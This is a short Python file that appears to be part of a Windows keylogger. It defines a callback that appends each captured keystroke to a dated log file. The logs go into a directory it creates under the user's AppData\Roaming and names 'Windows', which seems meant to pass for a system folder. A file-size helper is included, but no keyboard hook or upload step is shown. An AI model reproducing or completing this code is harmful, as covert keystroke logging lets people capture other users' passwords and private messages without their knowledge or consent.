import os
import getpass
from datetime import datetime

username = getpass.getuser()

# get name of log file (ex ->  2020-07-15.log)
def getlogfilename():
    now = datetime.now()
    now = str(now).split()[0]
    filename = now + ".log"
    return filename

# get path of log file 
def getlogfilepath(filename):
    dirpath = os.path.join("C:\\Users", username, "Appdata\\Roaming\\Windows")
    if not (os.path.isdir(dirpath)):
        os.makedirs(os.path.join(dirpath))
    filepath = os.path.join("C:\\Users", username, "Appdata\\Roaming\\Windows", filename)
    return filepath

# key logging
def logger(key):
    key = str(key).replace("'", '')
    f = open(getlogfilepath(getlogfilename()), mode = "at", encoding = "utf-8")
    f.write(key)
    f.close()

def getfilesize():
    filesize = os.path.getsize(getlogfilepath(getlogfilename()))
    return filesize